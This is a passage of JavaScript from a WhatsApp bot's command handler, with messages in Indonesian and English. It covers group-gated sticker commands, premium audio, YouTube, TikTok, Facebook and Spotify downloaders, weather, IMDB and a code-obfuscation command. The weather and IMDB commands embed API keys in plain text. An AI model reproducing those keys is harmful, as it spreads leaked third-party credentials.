            const groupMetadata = await XeonBotInc.groupMetadata(groupTarget)
            const participants = groupMetadata.participants.map(p => p.id)
            const senderJid = sender.endsWith('@s.whatsapp.net') ? sender : sender + '@s.whatsapp.net'
            return participants.includes(senderJid)
        } catch (err) {
            console.log('Gagal mendapatkan metadata grup:', err.message)
            return false
        }
    }

    if (!(await checkUserInGroup(m.sender))) {
        await XeonBotInc.sendMessage(m.chat, {
            text: '*Maaf, sepertinya kamu belum masuk ke dalam grup.*\n*Silakan masuk ke grup terlebih dahulu sebelum mengambil sticker.*\n\nLink Grup:\nhttps://chat.whatsapp.com/Iv3jpjyVZ2bFGNYVD6C6sD'
        }, { quoted: m })
        break
    }

    const totalStickers = 149
    const historyFile = './used_jomok.json'

    let used = []
    if (fs.existsSync(historyFile)) {
        try {
            used = JSON.parse(fs.readFileSync(historyFile))
        } catch (e) {
            console.error('Gagal membaca file histori:', e.message)
            used = []
        }
    }

    if (used.length >= totalStickers) {
        used = []
    }

    const allNumbers = [...Array(totalStickers)].map((_, i) => i + 1)
    const remaining = allNumbers.filter(n => !used.includes(n))

    let sent = false
    let attempts = 0
    const maxAttempts = 5

    while (!sent && attempts < maxAttempts && remaining.length > 0) {
        attempts++
        const randomNumber = remaining[Math.floor(Math.random() * remaining.length)]
        const fileName = `Jomok${randomNumber}.webp`
        const stickerUrl = `https://raw.githubusercontent.com/greenzombies1/sticker/main/jomok/${fileName}`

        // Cek apakah file sudah pernah di-forward
        if (forwardedJomok[fileName]) {
            try {
                await XeonBotInc.sendMessage(m.chat, {
                    forward: forwardedJomok[fileName]
                }, { quoted: m })

                used.push(randomNumber)
                fs.writeFileSync(historyFile, JSON.stringify(used))
                sent = true
                break
            } catch (err) {
                console.log('Gagal forward cache, fallback ke unduh ulang.')
                delete forwardedJomok[fileName]
            }
        }

        const isValidUrl = await fetch(stickerUrl).then(res => res.ok).catch(() => false)
        if (!isValidUrl) continue

        try {
            const buffer = await (await fetch(stickerUrl)).buffer()

            const sentMsg = await XeonBotInc.sendMessage(m.chat, { sticker: buffer }, { quoted: m })

            used.push(randomNumber)
            forwardedJomok[fileName] = sentMsg.key
            saveForwardedJomok()
            fs.writeFileSync(historyFile, JSON.stringify(used))
            sent = true
        } catch (err) {
            console.warn(`Gagal kirim stiker ${fileName}:`, err.message || err)
            await XeonBotInc.sendMessage(m.chat, {
                text: `*Stiker gagal dikirim: ${fileName}*\nFile kemungkinan rusak. Akan dicoba lagi...`,
            }, { quoted: m })

            used.push(randomNumber)
            fs.writeFileSync(historyFile, JSON.stringify(used))
        }
    }

    if (!sent) {
        await XeonBotInc.sendMessage(m.chat, {
            text: '*Maaf, semua percobaan mengirim stiker gagal.*\nBeberapa file mungkin rusak atau tidak valid.\nSilakan coba lagi nanti!',
        }, { quoted: m })
    }
}
break

case 'v1': {
    const groupTarget = '120363381650629890@g.us'

    async function checkUserInGroup(sender) {
        try {
            const groupMetadata = await XeonBotInc.groupMetadata(groupTarget)
            const participants = groupMetadata.participants.map(p => p.id)
            const senderJid = sender.endsWith('@s.whatsapp.net') ? sender : sender + '@s.whatsapp.net'
            return participants.includes(senderJid)
        } catch (err) {
            console.log('Gagal mendapatkan metadata grup:', err.message)
            return false
        }
    }

    if (!(await checkUserInGroup(m.sender))) {
        await XeonBotInc.sendMessage(m.chat, {
            text: '*Maaf, sepertinya kamu belum masuk ke dalam grup.*\n*Silakan masuk ke grup terlebih dahulu sebelum mengambil sticker.*\n\nLink Grup:\nhttps://chat.whatsapp.com/Iv3jpjyVZ2bFGNYVD6C6sD'
        }, { quoted: m })
        break
    }

    const totalStickers = 1000
    const historyFile = './used_v1.json'

    let used = []
    if (fs.existsSync(historyFile)) {
        try {
            used = JSON.parse(fs.readFileSync(historyFile))
        } catch (e) {
            used = []
        }
    }

    if (used.length >= totalStickers) {
        used = []
    }

    const allNumbers = [...Array(totalStickers)].map((_, i) => i + 1)
    const remaining = allNumbers.filter(n => !used.includes(n))

    let sent = false
    let attempts = 0
    const maxAttempts = 5

    while (!sent && attempts < maxAttempts && remaining.length > 0) {
        attempts++
        const randomNumber = remaining[Math.floor(Math.random() * remaining.length)]
        const fileName = `S${randomNumber}.webp`
        const stickerUrl = `https://raw.githubusercontent.com/greenzombies1/stickerv1/main/v1/${fileName}`

        if (forwardedV1[fileName]) {
            try {
                await XeonBotInc.sendMessage(m.chat, {
                    forward: forwardedV1[fileName]
                }, { quoted: m })

                used.push(randomNumber)
                fs.writeFileSync(historyFile, JSON.stringify(used))
                sent = true
                break
            } catch (err) {
                console.log('Gagal forward cache, fallback ke unduh ulang.')
                delete forwardedV1[fileName]
            }
        }

        const isValidUrl = await fetch(stickerUrl).then(res => res.ok).catch(() => false)
        if (!isValidUrl) continue

        try {
            const buffer = await (await fetch(stickerUrl)).buffer()

            const sentMsg = await XeonBotInc.sendMessage(m.chat, { sticker: buffer }, { quoted: m })

            used.push(randomNumber)
            forwardedV1[fileName] = sentMsg.key
            saveForwardedV1()
            fs.writeFileSync(historyFile, JSON.stringify(used))
            sent = true
        } catch (err) {
            console.warn(`Gagal kirim stiker ${fileName}:`, err.message || err)
            await XeonBotInc.sendMessage(m.chat, {
                text: `*Stiker gagal dikirim: ${fileName}*\nFile kemungkinan rusak. Akan dicoba lagi...`,
            }, { quoted: m })

            used.push(randomNumber)
            fs.writeFileSync(historyFile, JSON.stringify(used))
        }
    }

    if (!sent) {
        await XeonBotInc.sendMessage(m.chat, {
            text: '*Maaf, semua percobaan mengirim stiker gagal.*\nBeberapa file mungkin rusak atau tidak valid.\nSilakan coba lagi nanti!',
        }, { quoted: m })
    }
}
break
case 'kucing': {
    const groupTarget = '120363381650629890@g.us'

    async function checkUserInGroup(sender) {
        try {
            const groupMetadata = await XeonBotInc.groupMetadata(groupTarget)
            const participants = groupMetadata.participants.map(p => p.id)
            const senderJid = sender.endsWith('@s.whatsapp.net') ? sender : sender + '@s.whatsapp.net'
            return participants.includes(senderJid)
        } catch (err) {
            console.log('Gagal mendapatkan metadata grup:', err.message)
            return false
        }
    }

    if (!(await checkUserInGroup(m.sender))) {
        await XeonBotInc.sendMessage(m.chat, {
            text: '*Maaf, sepertinya kamu belum masuk ke dalam grup.*\n*Silakan masuk ke grup terlebih dahulu sebelum mengambil sticker.*\n\nLink Grup:\nhttps://chat.whatsapp.com/Iv3jpjyVZ2bFGNYVD6C6sD'
        }, { quoted: m })
        break
    }

    const totalStickers = 150
    const historyFile = './used_kucing.json'

    let used = []
    if (fs.existsSync(historyFile)) {
        try {
            used = JSON.parse(fs.readFileSync(historyFile))
        } catch (e) {
            used = []
        }
    }

    if (used.length >= totalStickers) {
        used = []
    }

    const allNumbers = [...Array(totalStickers)].map((_, i) => i + 1)
    const remaining = allNumbers.filter(n => !used.includes(n))

    let sent = false
    let attempts = 0
    const maxAttempts = 5

    while (!sent && attempts < maxAttempts && remaining.length > 0) {
        attempts++
        const randomNumber = remaining[Math.floor(Math.random() * remaining.length)]
        const fileName = `B${randomNumber}.webp`
        const stickerUrl = `https://raw.githubusercontent.com/greenzombies1/sticker/main/kucing/${fileName}`

        if (forwardedKucing[fileName]) {
            try {
                await XeonBotInc.sendMessage(m.chat, {
                    forward: forwardedKucing[fileName]
                }, { quoted: m })

                used.push(randomNumber)
                fs.writeFileSync(historyFile, JSON.stringify(used))
                sent = true
                break
            } catch (err) {
                console.log('Gagal forward cache, fallback ke unduh ulang.')
                delete forwardedKucing[fileName]
            }
        }

        const isValidUrl = await fetch(stickerUrl).then(res => res.ok).catch(() => false)
        if (!isValidUrl) continue

        try {
            const buffer = await (await fetch(stickerUrl)).buffer()
            const sentMsg = await XeonBotInc.sendMessage(m.chat, { sticker: buffer }, { quoted: m })

            used.push(randomNumber)
            forwardedKucing[fileName] = sentMsg.key
            saveForwardedKucing()
            fs.writeFileSync(historyFile, JSON.stringify(used))
            sent = true
        } catch (err) {
            console.warn(`Gagal kirim stiker ${fileName}:`, err.message || err)
            await XeonBotInc.sendMessage(m.chat, {
                text: `*Stiker gagal dikirim: ${fileName}*\nFile kemungkinan rusak. Akan dicoba lagi...`,
            }, { quoted: m })

            used.push(randomNumber)
            fs.writeFileSync(historyFile, JSON.stringify(used))
        }
    }

    if (!sent) {
        await XeonBotInc.sendMessage(m.chat, {
            text: '*Maaf, semua percobaan mengirim stiker gagal.*\nBeberapa file mungkin rusak atau tidak valid.\nSilakan coba lagi nanti!',
        }, { quoted: m })
    }
}
break
case 'makanan': {
    const groupTarget = '120363381650629890@g.us'

    async function checkUserInGroup(sender) {
        try {
            const groupMetadata = await XeonBotInc.groupMetadata(groupTarget)
            const participants = groupMetadata.participants.map(p => p.id)
            const senderJid = sender.endsWith('@s.whatsapp.net') ? sender : sender + '@s.whatsapp.net'
            return participants.includes(senderJid)
        } catch (err) {
            console.log('Gagal mendapatkan metadata grup:', err.message)
            return false
        }
    }

    if (!(await checkUserInGroup(m.sender))) {
        await XeonBotInc.sendMessage(m.chat, {
            text: '*Maaf, sepertinya kamu belum masuk ke dalam grup.*\n*Silakan masuk ke grup terlebih dahulu sebelum mengambil sticker.*\n\nLink Grup:\nhttps://chat.whatsapp.com/Iv3jpjyVZ2bFGNYVD6C6sD'
        }, { quoted: m })
        break
    }

    const totalStickers = 23
    const historyFile = './used_makanan.json'

    let used = []
    if (fs.existsSync(historyFile)) {
        try {
            used = JSON.parse(fs.readFileSync(historyFile))
        } catch (e) {
            used = []
        }
    }

    if (used.length >= totalStickers) {
        used = []
    }

    const allNumbers = [...Array(totalStickers)].map((_, i) => i + 1)
    const remaining = allNumbers.filter(n => !used.includes(n))

    let sent = false
    let attempts = 0
    const maxAttempts = 5

    while (!sent && attempts < maxAttempts && remaining.length > 0) {
        attempts++
        const randomNumber = remaining[Math.floor(Math.random() * remaining.length)]
        const fileName = `C${randomNumber}.webp`
        const stickerUrl = `https://raw.githubusercontent.com/greenzombies1/sticker/main/makanan/${fileName}`

        if (forwardedMakanan[fileName]) {
            try {
                await XeonBotInc.sendMessage(m.chat, {
                    forward: forwardedMakanan[fileName]
                }, { quoted: m })

                used.push(randomNumber)
                fs.writeFileSync(historyFile, JSON.stringify(used))
                sent = true
                break
            } catch (err) {
                console.log('Gagal forward cache, fallback ke unduh ulang.')
                delete forwardedMakanan[fileName]
            }
        }

        const isValidUrl = await fetch(stickerUrl).then(res => res.ok).catch(() => false)
        if (!isValidUrl) continue

        try {
            const buffer = await (await fetch(stickerUrl)).buffer()
            const sentMsg = await XeonBotInc.sendMessage(m.chat, { sticker: buffer }, { quoted: m })

            used.push(randomNumber)
            forwardedMakanan[fileName] = sentMsg.key
            saveForwardedMakanan()
            fs.writeFileSync(historyFile, JSON.stringify(used))
            sent = true
        } catch (err) {
            console.warn(`Gagal kirim stiker ${fileName}:`, err.message || err)
            await XeonBotInc.sendMessage(m.chat, {
                text: `*Stiker gagal dikirim: ${fileName}*\nFile kemungkinan rusak. Akan dicoba lagi...`,
            }, { quoted: m })

            used.push(randomNumber)
            fs.writeFileSync(historyFile, JSON.stringify(used))
        }
    }

    if (!sent) {
        await XeonBotInc.sendMessage(m.chat, {
            text: '*Maaf, semua percobaan mengirim stiker gagal.*\nBeberapa file mungkin rusak atau tidak valid.\nSilakan coba lagi nanti!',
        }, { quoted: m })
    }
}
break
case 'patrick': {
    const groupTarget = '120363381650629890@g.us'

    async function checkUserInGroup(sender) {
        try {
            const groupMetadata = await XeonBotInc.groupMetadata(groupTarget)
            const participants = groupMetadata.participants.map(p => p.id)
            const senderJid = sender.endsWith('@s.whatsapp.net') ? sender : sender + '@s.whatsapp.net'
            return participants.includes(senderJid)
        } catch (err) {
            console.log('Gagal mendapatkan metadata grup:', err.message)
            return false
        }
    }

    if (!(await checkUserInGroup(m.sender))) {
        await XeonBotInc.sendMessage(m.chat, {
            text: '*Maaf, sepertinya kamu belum masuk ke dalam grup.*\n*Silakan masuk ke grup terlebih dahulu sebelum mengambil sticker.*\n\nLink Grup:\nhttps://chat.whatsapp.com/Iv3jpjyVZ2bFGNYVD6C6sD'
        }, { quoted: m })
        break
    }

    const totalStickers = 83
    const historyFile = './used_patrick.json'

    let used = []
    if (fs.existsSync(historyFile)) {
        try {
            used = JSON.parse(fs.readFileSync(historyFile))
        } catch (e) {
            used = []
        }
    }

    if (used.length >= totalStickers) {
        used = []
    }

    const allNumbers = [...Array(totalStickers)].map((_, i) => i + 1)
    const remaining = allNumbers.filter(n => !used.includes(n))

    let sent = false
    let attempts = 0
    const maxAttempts = 5

    while (!sent && attempts < maxAttempts && remaining.length > 0) {
        attempts++
        const randomNumber = remaining[Math.floor(Math.random() * remaining.length)]
        const fileName = `D${randomNumber}.webp`
        const stickerUrl = `https://raw.githubusercontent.com/greenzombies1/sticker/main/patrick/${fileName}`

        if (forwardedPatrick[fileName]) {
            try {
                await XeonBotInc.sendMessage(m.chat, {
                    forward: forwardedPatrick[fileName]
                }, { quoted: m })

                used.push(randomNumber)
                fs.writeFileSync(historyFile, JSON.stringify(used))
                sent = true
                break
            } catch (err) {
                console.log('Gagal forward cache, fallback ke unduh ulang.')
                delete forwardedPatrick[fileName]
            }
        }

        const isValidUrl = await fetch(stickerUrl).then(res => res.ok).catch(() => false)
        if (!isValidUrl) continue

        try {
            const buffer = await (await fetch(stickerUrl)).buffer()
            const sentMsg = await XeonBotInc.sendMessage(m.chat, { sticker: buffer }, { quoted: m })

            used.push(randomNumber)
            forwardedPatrick[fileName] = sentMsg.key
            saveForwardedPatrick()
            fs.writeFileSync(historyFile, JSON.stringify(used))
            sent = true
        } catch (err) {
            console.warn(`Gagal kirim stiker ${fileName}:`, err.message || err)
            await XeonBotInc.sendMessage(m.chat, {
                text: `*Stiker gagal dikirim: ${fileName}*\nFile kemungkinan rusak. Akan dicoba lagi...`,
            }, { quoted: m })

            used.push(randomNumber)
            fs.writeFileSync(historyFile, JSON.stringify(used))
        }
    }

    if (!sent) {
        await XeonBotInc.sendMessage(m.chat, {
            text: '*Maaf, semua percobaan mengirim stiker gagal.*\nBeberapa file mungkin rusak atau tidak valid.\nSilakan coba lagi nanti!',
        }, { quoted: m })
    }
}
break

case 'v2': {
    const groupTarget = '120363381650629890@g.us'

    async function checkUserInGroup(sender) {
        try {
            const groupMetadata = await XeonBotInc.groupMetadata(groupTarget)
            const participants = groupMetadata.participants.map(p => p.id)
            const senderJid = sender.endsWith('@s.whatsapp.net') ? sender : sender + '@s.whatsapp.net'
            return participants.includes(senderJid)
        } catch (err) {
            console.log('Gagal mendapatkan metadata grup:', err.message)
            return false
        }
    }

    if (!(await checkUserInGroup(m.sender))) {
        await XeonBotInc.sendMessage(m.chat, {
            text: '*Maaf, sepertinya kamu belum masuk ke dalam grup.*\n*Silakan masuk ke grup terlebih dahulu sebelum mengambil sticker.*\n\nLink Grup:\nhttps://chat.whatsapp.com/Iv3jpjyVZ2bFGNYVD6C6sD'
        }, { quoted: m })
        break
    }

    const totalStickers = 60
    const historyFile = './used_v2.json'

    let used = []
    if (fs.existsSync(historyFile)) {
        try {
            used = JSON.parse(fs.readFileSync(historyFile))
        } catch (e) {
            used = []
        }
    }

    if (used.length >= totalStickers) {
        used = []
    }

    const allNumbers = [...Array(totalStickers)].map((_, i) => i + 1)
    const remaining = allNumbers.filter(n => !used.includes(n))

    let sent = false
    let attempts = 0
    const maxAttempts = 5

    while (!sent && attempts < maxAttempts && remaining.length > 0) {
        attempts++
        const randomNumber = remaining[Math.floor(Math.random() * remaining.length)]
        const fileName = `${randomNumber}.webp`
        const stickerUrl = `https://raw.githubusercontent.com/greenzombies1/sticker/main/v2/${fileName}`

        if (forwardedV2[fileName]) {
            try {
                await XeonBotInc.sendMessage(m.chat, {
                    forward: forwardedV2[fileName]
                }, { quoted: m })

                used.push(randomNumber)
                fs.writeFileSync(historyFile, JSON.stringify(used))
                sent = true
                break
            } catch (err) {
                console.log('Gagal forward cache, fallback ke unduh ulang.')
                delete forwardedV2[fileName]
            }
        }

        const isValidUrl = await fetch(stickerUrl).then(res => res.ok).catch(() => false)
        if (!isValidUrl) continue

        try {
            const buffer = await (await fetch(stickerUrl)).buffer()
            const sentMsg = await XeonBotInc.sendMessage(m.chat, { sticker: buffer }, { quoted: m })

            used.push(randomNumber)
            forwardedV2[fileName] = sentMsg.key
            saveForwardedV2()
            fs.writeFileSync(historyFile, JSON.stringify(used))
            sent = true
        } catch (err) {
            console.warn(`Gagal kirim stiker ${fileName}:`, err.message || err)
            await XeonBotInc.sendMessage(m.chat, {
                text: `*Stiker gagal dikirim: ${fileName}*\nFile kemungkinan rusak. Akan dicoba lagi...`,
            }, { quoted: m })

            used.push(randomNumber)
            fs.writeFileSync(historyFile, JSON.stringify(used))
        }
    }

    if (!sent) {
        await XeonBotInc.sendMessage(m.chat, {
            text: '*Maaf, semua percobaan mengirim stiker gagal.*\nBeberapa file mungkin rusak atau tidak valid.\nSilakan coba lagi nanti!',
        }, { quoted: m })
    }
}
break
    
    case 'soundprem':
    if (!isPremium) return replygcxeon(`*MAAF, FITUR INI KHUSUS UNTUK MEMBER PREMIUM*

*SILAHKAN HUBUNGI ADMIN UNTUK MENDAFTAR SEBAGAI MEMBER PREMIUM*
*BIAYANYA 10 RIBU PER BULAN*`);

    try {
        // Angka acak dari 1 sampai 44
        const randomNumber = Math.floor(Math.random() * 44) + 1;

        // URL file MP3 dari repo GitHub root
        const fileUrl = `https://github.com/greenzombies1/bott/raw/main/${randomNumber}.mp3`;

        const audioBuffer = await getBuffer(fileUrl);
        if (!audioBuffer) {
            reply('Error: Gagal mengambil file audio.');
            return;
        }

        await XeonBotInc.sendMessage(m.chat, { 
            audio: audioBuffer, 
            mimetype: 'audio/mpeg',
            ptt: true 
        }, { quoted: m });

    } catch (err) {
        console.error('Error saat mengirim audio:', err);
        reply('Terjadi kesalahan saat mengirim audio.');
    }
    break;
    
case 'friend':
case 'searchfriend':{
await XeonStickWait()
let teman = pickRandom(xeonverifieduser)
setTimeout(() => {
}, 1000)
setTimeout(() => {
replygcxeon('Managed to Get One Person')
}, 5000)
setTimeout(() => {
XeonBotInc.sendMessage(from, {text: `Here @${teman.split("@")[0]}`, mentions: [teman]}, { quoted : m })
}, 9000)
}
break
case 'q': case 'quoted': {
if (!m.quoted) return replygcxeon('Reply the Message!!')
let xeonquotx= await XeonBotInc.serializeM(await m.getQuotedObj())
if (!xeonquotx.quoted) return replygcxeon('The message you are replying to is not sent by the bot')
await xeonquotx.quoted.copyNForward(m.chat, true)
}
break
case 'obfus': case 'obfuscate':{
if (!q) return replygcxeon(`Example ${prefix+command} const xeonbot = require('baileys')`)
let meg = await obfus(q)
replygcxeon(`Success
${meg.result}`)
}
break
case 'style': case 'styletext': {
		let { styletext } = require('./lib/scraper')
		if (!text) return replygcxeon('Enter Query text!')
                let anu = await styletext(text)
                let teks = `Style Text From ${text}\n\n`
                for (let i of anu) {
                    teks += `${themeemoji} *${i.name}* : ${i.result}\n\n`
                }
                replygcxeon(teks)
	    }
	    break
case 'yts': case 'ytsearch': {
                if (!text) return replygcxeon(`Example : ${prefix + command} story wa anime`)
                let yts = require("yt-search")
                let search = await yts(text)
                let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += `${themeemoji} No : ${no++}\n${themeemoji} Type : ${i.type}\n${themeemoji} Video ID : ${i.videoId}\n${themeemoji} Title : ${i.title}\n${themeemoji} Views : ${i.views}\n${themeemoji} Duration : ${i.timestamp}\n${themeemoji} Uploaded : ${i.ago}\n${themeemoji} Url : ${i.url}\n\n─────────────────\n\n`
                }
                XeonBotInc.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break
            case 'play':  case 'song': {
if (!text) return replygcxeon(`Example : ${prefix + command} anime whatsapp status`)
const xeonplaymp3 = require('./lib/ytdl')
let yts = require("youtube-yts")
        let search = await yts(text)
        let anup3k = search.videos[0]
const pl= await xeonplaymp3.mp3(anup3k.url)
await XeonBotInc.sendMessage(m.chat,{
    audio: fs.readFileSync(pl.path),
    fileName: anup3k.title + '.mp3',
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:anup3k.title,
            body: botname,
            thumbnail: await fetchBuffer(pl.meta.image),
            sourceUrl: websitex,
            mediaType:2,
            mediaUrl:anup3k.url,
        }

    },
},{quoted:m})
await fs.unlinkSync(pl.path)
}
break
case 'ytmp3': case 'ytaudio':
let xeonaudp3 = require('./lib/ytdl')
if (args.length < 1 || !isUrl(text) || !xeonaudp3.isYTUrl(text)) return replygcxeon(`Where's the yt link?\nExample: ${prefix + command} https://youtube.com/shorts/YQf-vMjDuKY?feature=share`)
let audio = await xeonaudp3.mp3(text)
await XeonBotInc.sendMessage(m.chat,{
    audio: fs.readFileSync(audio.path),
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:audio.meta.title,
            body: botname,
            thumbnail: await fetchBuffer(audio.meta.image),
            mediaType:2,
            mediaUrl:text,
        }

    },
},{quoted:m})
await fs.unlinkSync(audio.path)
break
case 'ytmp4': case 'ytvideo': {
const xeonvidoh = require('./lib/ytdl')
if (args.length < 1 || !isUrl(text) || !xeonvidoh.isYTUrl(text)) replygcxeon(`Where is the link??\n\nExample : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`)
const vid=await xeonvidoh.mp4(text)
const ytc=`
*${themeemoji}Tittle:* ${vid.title}
*${themeemoji}Date:* ${vid.date}
*${themeemoji}Duration:* ${vid.duration}
*${themeemoji}Quality:* ${vid.quality}`
await XeonBotInc.sendMessage(m.chat,{
    video: {url:vid.videoUrl},
    caption: ytc
},{quoted:m})
}
break
case 'git': case 'gitclone':
if (!args[0]) return replygcxeon(`Where is the link?\nExample :\n${prefix}${command} https://github.com/DGXeon/XeonMedia`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return replygcxeon(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    XeonBotInc.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => replygcxeon(mess.error))
break
case 'tiktok':{
if (!q) return replygcxeon( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return replygcxeon(`Link Invalid!!`)
require('./lib/tiktok').Tiktok(q).then( data => {
XeonBotInc.sendMessage(m.chat, { caption: `Here you go!`, video: { url: data.watermark }}, {quoted:m})
})
}
break
case 'tiktokaudio':{
if (!q) return replygcxeon( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return replygcxeon(`Link Invalid!!`)
require('./lib/tiktok').Tiktok(q).then( data => {
const xeontikmp3 = {url:data.audio}
XeonBotInc.sendMessage(m.chat, { audio: xeontikmp3, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
})
}
break
case 'google': {
if (!q) return replygcxeon(`Example : ${prefix + command} ${botname}`)
await XeonStickWait()
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `⭔ *Title* : ${g.title}\n`
teks += `⭔ *Description* : ${g.snippet}\n`
teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
replygcxeon(teks)
})
}
break
case 'weather':{
if (!text) return replygcxeon('What location?')
            let wdata = await axios.get(
                `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
            );
            let textw = ""
            textw += `*🗺️Weather of  ${text}*\n\n`
            textw += `*Weather:-* ${wdata.data.weather[0].main}\n`
            textw += `*Description:-* ${wdata.data.weather[0].description}\n`
            textw += `*Avg Temp:-* ${wdata.data.main.temp}\n`
            textw += `*Feels Like:-* ${wdata.data.main.feels_like}\n`
            textw += `*Pressure:-* ${wdata.data.main.pressure}\n`
            textw += `*Humidity:-* ${wdata.data.main.humidity}\n`
            textw += `*Humidity:-* ${wdata.data.wind.speed}\n`
            textw += `*Latitude:-* ${wdata.data.coord.lat}\n`
            textw += `*Longitude:-* ${wdata.data.coord.lon}\n`
            textw += `*Country:-* ${wdata.data.sys.country}\n`

           XeonBotInc.sendMessage(
                m.chat, {
                    text: textw,
                }, {
                    quoted: m,
                }
           )
           }
           break
           case 'fb':
           case 'facebook': {
           if (!args[0]) {
    return replygcxeon(`Please send the link of a Facebook video\n\nEXAMPLE :\n*${prefix + command}* https://fb.watch/pLLTM4AFrO/?mibextid=Nif5oz`)
  }
  const urlRegex = /^(?:https?:\/\/)?(?:www\.)?(?:facebook\.com|fb\.watch)\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)/i;
  if (!urlRegex.test(args[0])) {
    return replygcxeon('Url invalid')
  }
  try {
    const result = await fg.fbdl(args[0]);
    const tex = `
        [ FACEBOOK DL ]
${themeemoji} Title: ${result.title}`;
    const response = await fetch(result.videoUrl)
    const arrayBuffer = await response.arrayBuffer()
    const videoBuffer = Buffer.from(arrayBuffer)
    XeonBotInc.sendMessage(m.chat, {video: videoBuffer, caption: tex}, {quoted: m})
  } catch (error) {
    replygcxeon('Maybe private video!')
  }
  }
  break

case 'spotify':{
	if (!text) return replygcxeon(`*Please enter a song name*`)
    try {
        const apiUrl = `https://www.guruapi.tech/api/spotifyinfo?text=${encodeURIComponent(text)}`
        const response = await fetch(apiUrl);
        if (!response.ok) {
            console.log('Error searching for song:', response.statusText)
            return replygcxeon('Error searching for song')
        }
        const data = await response.json()
        const coverimage = data.spty.results.thumbnail
        const name = data.spty.results.title
        const slink = data.spty.results.url
        const dlapi = `https://www.guruapi.tech/api/spotifydl?text=${encodeURIComponent(text)}`
        const audioResponse = await fetch(dlapi)
        if (!audioResponse.ok) {
            console.log('Error fetching audio:', audioResponse.statusText)
            return replygcxeon('Error fetching audio')
        }
        const audioBuffer = await audioResponse.buffer()
        const tempDir = os.tmpdir()
        const audioFilePath = path.join(tempDir, 'audio.mp3')
        try {
            await fs.promises.writeFile(audioFilePath, audioBuffer)
        } catch (writeError) {
            console.error('Error writing audio file:', writeError)
            return replygcxeon( 'Error writing audio file')
        }
        let doc = {
            audio: {
              url: audioFilePath
            },
            mimetype: 'audio/mpeg',
            ptt: true,
            waveform:  [100, 0, 100, 0, 100, 0, 100],
            fileName: "dgxeon",
            contextInfo: {
              mentionedJid: [m.sender],
              externalAdReply: {
                title: `PLAYING TO ${name}`,
                body: botname,
                thumbnailUrl: coverimage,
                sourceUrl: websitex,
                mediaType: 1,
                renderLargerThumbnail: true
              }
            }
        }        
        await XeonBotInc.sendMessage(m.chat, doc, { quoted: m })
    } catch (error) {
        console.error('Error fetching Spotify data:', error)
        return replygcxeon('*Error*')
    }
    }
    break
case 'imdb':
if (!text) return replygcxeon(`_Name a Series or movie`)
await XeonStickWait()
            let fids = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`)
            let imdbt = ""
            console.log(fids.data)
            imdbt += "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n" + " ``` IMDB SEARCH```\n" + "⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n"
            imdbt += "🎬Title      : " + fids.data.Title + "\n"
            imdbt += "📅Year       : " + fids.data.Year + "\n"
            imdbt += "⭐Rated      : " + fids.data.Rated + "\n"
            imdbt += "📆Released   : " + fids.data.Released + "\n"
            imdbt += "⏳Runtime    : " + fids.data.Runtime + "\n"
            imdbt += "🌀Genre      : " + fids.data.Genre + "\n"
            imdbt += "👨🏻‍💻Director   : " + fids.data.Director + "\n"
            imdbt += "✍Writer     : " + fids.data.Writer + "\n"
            imdbt += "👨Actors     : " + fids.data.Actors + "\n"
            imdbt += "📃Plot       : " + fids.data.Plot + "\n"
            imdbt += "🌐Language   : " + fids.data.Language + "\n"
            imdbt += "🌍Country    : " + fids.data.Country + "\n"
            imdbt += "🎖️Awards     : " + fids.data.Awards + "\n"
            imdbt += "📦BoxOffice  : " + fids.data.BoxOffice + "\n"
            imdbt += "🏙️Production : " + fids.data.Production + "\n"
            imdbt += "🌟imdbRating : " + fids.data.imdbRating + "\n"
            imdbt += "✅imdbVotes  : " + fids.data.imdbVotes + ""
           XeonBotInc.sendMessage(m.chat, {
                image: {
                    url: fids.data.Poster,
                },
                caption: imdbt,
            }, {
                quoted: m,
            })
            break
            case 'ebinary': {
if (!q) return replygcxeon(`Send/reply text with captions ${prefix + command}`)
let { eBinary } = require('./lib/binary')
let eb = await eBinary(`${q}`)
replygcxeon(eb)
}
break
case 'dbinary': {
if (!q) return replygcxeon(`Send/reply text with captions ${prefix + command}`)
let { dBinary } = require('./lib/binary')
let db = await dBinary(`${q}`)
replygcxeon(db)
}
break
case 'happymod':{
if (!q) return replygcxeon(`Example ${prefix+command} Sufway surfer mod`)
await XeonStickWait()
let kat = await scp2.happymod(q)
replygcxeon(util.format(kat))
}
break
case 'gdrive': {
		if (!args[0]) return replygcxeon(`Enter the Google Drive link`)
	await XeonStickWait()
	const fg = require('api-dylux')
	try {
	let res = await fg.GDriveDl(args[0])
	 await replygcxeon(`
≡ *Google Drive DL*
▢ *Nama:* ${res.fileName}
▢ *Size:* ${res.fileSize}
▢ *Type:* ${res.mimetype}`)
	XeonBotInc.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
   } catch {
	replygcxeon('Error: Check link or try another link') 
  }
}
break
case 'pinterest': {
